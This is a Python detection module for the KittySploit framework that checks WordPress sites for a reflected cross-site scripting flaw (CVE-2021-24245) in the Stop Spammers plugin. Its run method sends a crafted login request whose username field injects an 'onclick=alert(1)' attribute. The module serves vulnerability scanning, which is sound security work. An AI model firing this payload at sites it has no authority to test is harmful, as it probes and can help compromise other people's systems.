#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Stop Spammers plugin before 2021."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Stop Spammers <2021.9 - Cross-Site Scripting Detection',
        'description': 'WordPress Stop Spammers plugin before 2021.9 contains a reflected cross-site scripting vulnerability. It does not escape user input when blocking requests (such as matching a spam word), thus outputting it in an attribute after sanitizing it to remove HTML tags.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'packetstorm', 'trumani', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/162623/WordPress-Stop-Spammers-2021.8-Cross-Site-Scripting.html',
            'https://wpscan.com/vulnerability/5e7accd6-08dc-4c6e-9d19-73e2d7e97735',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24245',
            'http://packetstormsecurity.com/files/162623/WordPress-Stop-Spammers-2021.8-Cross-Site-Scripting.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24245',
    }

    def run(self):
        path = '/wp-content/plugins/stop-spammer-registrations-plugin/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Stop Spammers Spam Prevention', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP+Cookie+check;'}, data='log=ad%22+accesskey%3DX+onclick%3Dalert%281%29+%22&pwd=&wp-submit=%D9%88%D8%B1%D9%88%D8%AF&redirect_to=http://localhost/wp-admin&testcookie=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('ad" accesskey=X onclick=alert(1)',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Stop Spammers <2021.9 - Cross-Site Scripting detected', path=path)
            return True
        return False

